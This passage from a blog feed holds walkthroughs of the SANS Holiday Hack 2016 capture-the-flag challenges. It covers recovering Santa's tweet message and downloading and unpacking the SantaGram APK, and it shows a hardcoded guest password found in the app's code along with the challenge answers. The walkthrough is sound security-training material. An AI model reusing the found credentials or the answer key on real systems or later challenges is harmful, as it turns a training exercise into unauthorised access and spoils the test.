      &lt;td&gt;./SantaGram_4.2/smali/com/northpolewonderland/santagram/&lt;/td&gt;
      &lt;td&gt;SplashScreen.smali&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;guest&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;busyreindeer78&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Using another &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; command, we’ll be able to find the audio file too.  When I think of audio formats, MP3 is arguably the most popular format, so let’s see if there are any MP3 files in the extracted SantaGram_4.2 directory.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ grep -ir 'mp3' SantaGram_4.2&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/original/META-INF/CERT.SF:Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;res/raw/discombobulatedaudio1.mp3&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/original/META-INF/MANIFEST.MF:Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;res/raw/discombobulatedaudio1.mp3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There you have it.  The location of the first audio file flag has been discovered.&lt;/p&gt;

&lt;p class=&quot;notice&quot;&gt;Question 4: What is the name of the audible component (audio file) in the SantaGram APK file?&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Location&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;File Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;MD5&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;./SantaGram_4.2/res/raw/&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio1.mp3&quot;&gt;discombobulatedaudio1.mp3&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;b7aca2f218c39b997bfd61b83856aed2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Challenges - Part 2</summary></entry><entry><title type="html">Part 1: A Most Curious Business Card</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt1-2016/" rel="alternate" type="text/html" title="Part 1: A Most Curious Business Card" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt1-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt1-2016/">&lt;p class=&quot;notice--danger&quot;&gt;Question 1: What is the secret message in Santa’s tweets?&lt;/p&gt;
&lt;p class=&quot;notice--danger&quot;&gt;Question 2: What is inside the ZIP file distributed by Santa’s team?&lt;/p&gt;

&lt;p&gt;In order to answer these questions, you first had to know a little information about Santa.  Luckily, all the information needed was printed on his business card discovered by Josh and Jessica Dosis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/santa_business_card.png&quot; alt=&quot;Santa's Business Card&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Per the card, Santa is &lt;a href=&quot;https://twitter.com/SantaWClaus&quot;&gt;@santawclaus&lt;/a&gt; on twitter.  Let’s check out his account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/santa_twitter.png&quot; alt=&quot;Santa's twitter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Discovery of his hidden message required scraping and saving all his tweets.  To do this, I used a free service called &lt;a href=&quot;http://twlets.com&quot;&gt;twlets&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/grab_tweets_twitter.png&quot; alt=&quot;twlets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was able to export them to an Excel (XLSX) file.&lt;/p&gt;

&lt;p&gt;An image started to appear in &lt;code class=&quot;highlighter-rouge&quot;&gt;Column E&lt;/code&gt; but it wasn’t clear.  This was fixed by changing to a “Fixed Width” font.&lt;br /&gt;
I chose the appropriately named font “Hack.”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/santa_tweets.gif&quot; alt=&quot;animated_gif&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;notice&quot;&gt;What is the secret message in Santa’s tweets?
&lt;strong&gt;bugbounty&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Answering the second question required performing some detective work on Santa’s &lt;a href=&quot;https://www.instagram.com/santawclaus&quot;&gt;@santawclaus&lt;/a&gt; instagram account.&lt;/p&gt;

&lt;p&gt;The first picture he uploaded contained the required information to download the ZIP file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/santa_instagram.png&quot; alt=&quot;instagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(enhance…)&lt;/p&gt;

&lt;p&gt;Combining the URL on the paper (1) with the file name on the monitor (2) gave the direct location for the ZIP file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/zip_location.png&quot; alt=&quot;instagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Grab the ZIP file and extract the contents.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ curl -O www.northpolewonderland.com/SantaGram_v4.2.zip&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
                                 &lt;span class=&quot;s&quot;&gt;Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;100 1917k  100 1917k    0     0  4678k      0 --:--:-- --:--:-- --:--:-- 4687k&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ file SantaGram_v4.2.zip&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_v4.2.zip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Zip archive data, at least v2.0 to extract&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/Downloads $ unzip SantaGram_v4.2.zip&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Archive&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;SantaGram_v4.2.zip&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SantaGram_v4.2.zip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SantaGram_4.2.apk password&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;inflating&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SantaGram_4.2.apk&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice&quot;&gt;What is inside the ZIP file distributed by Santa’s team?
&lt;strong&gt;&lt;a href=&quot;/assets/files/SantaGram_4.2.apk&quot;&gt;SantaGram_4.2.apk&lt;/a&gt;&lt;/strong&gt; (MD5 = bdb7ca46ce95e9652616852d7c1cf127)&lt;/p&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Challenges - Part 1</summary></entry><entry><title type="html">SANS Holiday Hack Challenge 2014</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-2014/" rel="alternate" type="text/html" title="SANS Holiday Hack Challenge 2014" /><published>2015-06-24T00:00:00-07:00</published><updated>2015-06-24T04:50:46-07:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-2014</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-2014/">&lt;p&gt;Since 2011, the SANS Institute has held a holiday hacking challenge&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; that is open to the public. In 2014, I give it a shot and was able to solve all the puzzles and complete a walkthrough explaining how I did it.&lt;/p&gt;

&lt;p&gt;Here is a direct link to my &lt;a href=&quot;http://blogs.sans.org/pen-testing/files/2015/02/SANS-Holiday-Hacking-Challenge-2014-Report-Joshua-Tomkiel.pdf&quot;&gt;official write-up in PDF&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:1&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;http://pen-testing.sans.org/holiday-challenge/2014&quot;&gt;http://pen-testing.sans.org/holiday-challenge/2014&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2014 Writeup</summary></entry></feed>